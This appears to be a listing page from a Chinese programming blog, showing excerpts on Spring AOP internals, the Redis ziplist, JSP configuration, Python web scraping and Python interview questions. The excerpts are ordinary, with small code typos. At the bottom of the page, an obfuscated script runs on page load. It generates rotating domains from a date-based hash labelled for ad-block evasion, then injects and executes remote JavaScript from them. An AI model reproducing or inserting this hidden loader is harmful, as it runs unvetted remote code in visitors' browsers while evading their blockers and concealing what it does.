1、因为@PointCut注解的范围可能是多个类，这些类有共同的方法，就例如图中有两个类适合，他们有三个方法同名，假设在代码中定义前置通知，这个通知在类A和类B的这三个方法都能使用，这样每个方法的前置部分的位置，就是连接点JoinPoint，而这些前置通知的JoinPoint的集合，就是pointcut
2、Aspect: JoinPoint+Advice组成了一个切面类
3、每个JointPoint对应一个Advice，可是一个Advice对应多个JointPoint
2. @EnableAspectJAutoProxy的来龙去脉 我们先看一下@EnableAspectJAutoProxy注解里面
@Target(ElementType.TYPE) @Retention(RetentionPolicy.RUNTIME) @Documented @Import(AspectJAutoProxyRegistrar.class) public @interface EnableAspectJAutoProxy { boolean proxyTargetClass() default false; boolean exposeProxy() default false; } 划重点:这里面有@Import(AspectJAutoProxyRegistrar.class)注解，这个是关键！！!下面会讲到
因为下面涉及到@Import的知识点，如果想了解他具体的源码，可以看我之前的文章:
Spring之@Import注解使用和spring源码分析_程序源仔的博客-CSDN博客
看一下AOP核心流程图
看不清没关系，还有高清链接
aop全流程图| ProcessOn免费在线作图,在线流程图,在线思维导图
1、左边青色和紫色部分一起讲
IOC容器启动时，调用了ConfigurationClassPostProcessor#postProcessBeanDefinitionRegistry(registry),因为这个类继承了BeanFactoryPostProcessor，所以在这里会被执行。而@EnableAspectJAutoProxy是用来开启AOP的，他里面有@Import(AspectJAutoProxyRegistrar.class)注解，而postProcessBeanDefinitionRegistry里面就是负责扫描并导入了带有@Import注解的类AspectJAutoProxyRegistrar 类继承了ImportBeanDefinitionRegistrar接口，里面有个registerBeanDefinitions()方法要实现，他的作用是把AnnotationAwareAspectJAutoProxyCreator注册到容器中而AnnotationAwareAspectJAutoProxyCreator继承了AbstractAutoProxyCreator，而AbstractAutoProxyCreator是一个BeanPostProcessor，在容器后面初始化实例对象后，会调用到他至此，与AOP相关的处理器注册完成 2、右边青色部分
在调用getBean()的时候，会去执行bean的生命周期，实例化、属性赋值、初始化，等走到bean的初始化结束后，会去调用后置处理器，执行applyBeanPostProcessorsAfterInitialization()方法，这个后置处理器是BeanPostProcessor，切点（pointcut）对应的代理对象这时候就会被创建而灰色部分注入的AnnotationAwareAspectJAutoProxyCreator就是继承了BeanPostProcessor，因为AnnotationAwareAspectJAutoProxyCreator继承了AbstractAutoProxyCreator所以执行的其实是AbstractAutoProxyCreator的postProcessAfterInitialization方法，这个类就是和AOP相关的 3、红色部分（生成代理对象）
在AbstractAutoProxyCreator的postProcessAfterInitialization方法中会先通过getAdvicesAndAdvisorsForBean获取Bean对应的advisor数组(里面就是一系列通知advice)这些advisor数组就是在Spring扫描定义好的@Aspect切面类时保存好的然后将相关的advice作为参数，传到createProxy方法中，这一步生成一个代理对象 下面给出AnnotationAwareAspectJAutoProxyCreator的继承图
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/724a843e5c7123e2e195d29d66e9b050/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/523565ba6fd8b4ee320e199643717e4e/" rel="bookmark">
			redis源码浅析-ziplist实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		redis中的list是有多种实现的，其中一种是ziplist，其介绍如下
ziplist 是一个经过特殊编码的双向链表，旨在提高内存效率。 它存储字符串和整数值，其中整数被编码为实际整数而不是一系列字符。 它允许在 O(1) 时间内在列表的任一侧进行推送和弹出操作。 但是，由于每个操作都需要重新分配 ziplist 使用的内存，因此实际复杂性与 ziplist 使用的内存量有关。
ziplist是一个双向链表结构，是一整块紧凑的内存块，当大小不足需要重新扩展，底层使用je_realloc进行扩展。
typedef struct zlentry { unsigned int prevrawlensize; // prevrawlen字段的字节数大小，前一节点的大小的类型，1字节或者5字节 unsigned int prevrawlen; // 前一个节点的的长度 unsigned int lensize; // len字段的字节数大小 unsigned int len; unsigned int headersize; /* prevrawlensize + lensize. */ unsigned char encoding; /* Set to ZIP_STR_* or ZIP_INT_* depending on the entry encoding. However for 4 bits immediate integers this can assume a range of values and must be range-checked.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/523565ba6fd8b4ee320e199643717e4e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9133998f049913de2a9c04fe8b692961/" rel="bookmark">
			jsp路径问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 jsp路径问题 当我们新建一个web项目的时候，常常有时候会因为改变了index.jsp的位置，或将其不小心删了而出现404问题。 这种情况我们可以去改变web.xml来解决这一个问题，解决方案： &lt;welcome-file-list&gt; //写入你要展示的jsp &lt;welcome-file&gt;login.jsp&lt;/welcome-file&gt; &lt;/welcome-file-list&gt; e-list&gt;
当然还可以通过其他方式解决，更多方式下次会说到，这一个方式也可以解决这个问题。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2b90c669509eed3965d8d91db07b5902/" rel="bookmark">
			python爬虫之ajax网页抓取
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在进行python爬虫时，我们经常会面对一些采用Ajax异步加载数据的网页，这种情况下，我们无法通过直接获取网页源代码来获取需要的数据。本文将介绍如何使用python爬虫抓取Ajax网页。
一、Ajax简介 Ajax全称为Asynchronous JavaScript and XML，即异步JavaScript和XML。它是一种通过JavaScript和XML技术在不刷新整个页面的情况下实现数据交互的Web开发技术。通过Ajax技术，我们可以实现异步加载网页内容，减小了服务器和客户端的负担，提高了用户的交互体验。
二、Ajax网页的抓取原理 对于Ajax网页的抓取，我们需要先了解其基本的抓取原理。一般来说，Ajax的数据请求返回的结果是JSON或XML格式的数据，而不是HTML网页源代码。因此，我们不能像普通网页一样直接获取整个网页源代码。实际上，我们需要模拟Ajax请求，然后从响应数据中提取出我们需要的数据。
以爬取“中国天气网”为例，该网站的天气信息是通过Ajax异步加载获取的。我们可以通过浏览器调试工具打开network选项卡，找到我们需要的天气信息的请求地址，从响应结果中，我们可以找到包含了我们所需的天气信息的JSON数据。
三、代码实现 1.分析Ajax请求
在进行Ajax网页的抓取时，我们需要先分析响应JSON数据的请求。我们可以通过浏览器调试工具的network选项卡找到这个请求。在我们需要的数据请求下方，选择Headers选项卡，找到Request URL，这就是我们需要的请求地址。
2.读取响应数据
接下来，我们通过python的requests库模拟Ajax请求，并读取响应数据。代码如下：
import requests import json url = 'http://www.weather.com.cn/data/sk/101010100.html' # 请求地址 headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36', # 请求头部 'Accept-Language': 'zh-CN,zh;q=0.9', # 语言 'X-Requested-With': 'XMLHttpRequest' # 表示Ajax请求 } response = requests.get(url, headers=headers) # 模拟Ajax请求 text = response.content.decode('utf-8') # 读取响应数据 data = json.loads(text) # 解析json数据 print(data) 结果输出：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2b90c669509eed3965d8d91db07b5902/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7c21a3d3c51cdec415d7b4519e95c698/" rel="bookmark">
			10个Python爬虫入门实例，建议收藏！！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 爬取强大的BD页面，打印页面信息
# 第一个爬虫示例,爬取百度页面 import requests #导入爬虫的库，不然调用不了爬虫的函数 response = requests.get("http://www.baidu.com") #生成一个response对象 response.encoding = response.apparent_encoding #设置编码格式 print("状态码:"+ str( response.status_code ) ) #打印状态码 print(response.text)#输出爬取的信息 2.常用方法之get方法实例，下面还有传参实例
# 第二个get方法实例 import requests #先导入爬虫的库，不然调用不了爬虫的函数 response = requests.get("http://httpbin.org/get") #get方法 print( response.status_code ) #状态码 print( response.text ) 3.常用方法之post方法实例，下面还有传参实例
# 第三个 post方法实例 import requests #先导入爬虫的库，不然调用不了爬虫的函数 response = requests.post("http://httpbin.org/post") #post方法访问 print( response.status_code ) #状态码 print( response.text ) put方法实例 # 第四个 put方法实例 import requests #先导入爬虫的库，不然调用不了爬虫的函数 response = requests.put("http://httpbin.org/put") # put方法访问 print( response.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7c21a3d3c51cdec415d7b4519e95c698/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6270e965e91034e8fb9bddcd8b9aa80b/" rel="bookmark">
			16道Python经典面试题及答案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着Python在企业中的应用越来越多，岗位需求越来越大，面试成为了搞定优质职位的快速方式，下面是笔者面试10余家企业总结的面试题，希望对Python从业者有帮助。
1.Python是如何进行内存管理的？
答:从三个方面来说,一对象的引用计数机制,二垃圾回收机制,三内存池机制
一、对象的引用计数机制
Python内部使用引用计数，来保持追踪内存中的对象，所有对象都有引用计数。
引用计数增加的情况：
1，一个对象分配一个新名称
2，将其放入一个容器中（如列表、元组或字典）
引用计数减少的情况：
1，使用del语句对对象别名显示的销毁
2，引用超出作用域或被重新赋值
sys.getrefcount( )函数可以获得对象的当前引用计数
多数情况下，引用计数比你猜测得要大得多。对于不可变数据（如数字和字符串），解释器会在程序的不同部分共享内存，以便节约内存。
二、垃圾回收
1，当一个对象的引用计数归零时，它将被垃圾收集机制处理掉。
2，当两个对象a和b相互引用时，del语句可以减少a和b的引用计数，并销毁用于引用底层对象的名称。然而由于每个对象都包含一个对其他对象的应用，因此引用计数不会归零，对象也不会销毁。（从而导致内存泄露）。为解决这一问题，解释器会定期执行一个循环检测器，搜索不可访问对象的循环并删除它们。
三、内存池机制
Python提供了对内存的垃圾收集机制，但是它将不用的内存放到内存池而不是返回给操作系统。
1，Pymalloc机制。为了加速Python的执行效率，Python引入了一个内存池机制，用于管理对小块内存的申请和释放。
2，Python中所有小于256个字节的对象都使用pymalloc实现的分配器，而大的对象则使用系统的malloc。
3，对于Python对象，如整数，浮点数和List，都有其独立的私有内存池，对象间不共享他们的内存池。也就是说如果你分配又释放了大量的整数，用于缓存这些整数的内存就不能再分配给浮点数。
2.什么是lambda函数？它有什么好处?
答：lambda 表达式，通常是在需要一个函数，但是又不想费神去命名一个函数的场合下使用，也就是指匿名函数
lambda函数：首要用途是指点短小的回调函数
lambda [arguments]:expression &gt;&gt;&gt; a=lambdax,y:x+y &gt;&gt;&gt; a(3,11) 3.Python里面如何实现tuple和list的转换？
答：直接使用tuple和list函数就行了，type()可以判断对象的类型
4.请写出一段Python代码实现删除一个list里面的重复元素
答：
1,使用set函数，set(list)
2，使用字典函数，
&gt;&gt;&gt;a=[1,2,4,2,4,5,6,5,7,8,9,0] &gt;&gt;&gt; b={} &gt;&gt;&gt;b=b.fromkeys(a) &gt;&gt;&gt;c=list(b.keys()) &gt;&gt;&gt; c 5.编程用sort进行排序，然后从最后一个元素开始判断
a=[1,2,4,2,4,5,7,10,5,5,7,8,9,0,3] a.sort() last=a[-1] for i inrange(len(a)-2,-1,-1): if last==a[i]: del a[i] else:last=a[i] print(a) 6.Python里面如何拷贝一个对象？（赋值，浅拷贝，深拷贝的区别）
答：赋值（=），就是创建了对象的一个新的引用，修改其中任意一个变量都会影响到另一个。
浅拷贝：创建一个新的对象，但它包含的是对原始对象中包含项的引用（如果用引用的方式修改其中一个对象，另外一个也会修改改变）{1,完全切片方法；2，工厂函数，如list()；3，copy模块的copy()函数}
深拷贝：创建一个新的对象，并且递归的复制它所包含的对象（修改其中一个，另外一个不会改变）{copy模块的deep.deepcopy()函数}
7.介绍一下except的用法和作用？
答：try…except…except…[else…][finally…]
执行try下的语句，如果引发异常，则执行过程会跳到except语句。对每个except分支顺序尝试执行，如果引发的异常与except中的异常组匹配，执行相应的语句。如果所有的except都不匹配，则异常会传递到下一个调用本代码的最高层try代码中。
try下的语句正常执行，则执行else块代码。如果发生异常，就不会执行
如果存在finally语句，最后总是会执行。
8.Python中pass语句的作用是什么？
答：pass语句不会执行任何操作，一般作为占位符或者创建占位程序，whileFalse:pass
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6270e965e91034e8fb9bddcd8b9aa80b/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/136/">«</a>
	<span class="pagination__item pagination__item--current">137/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/138/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>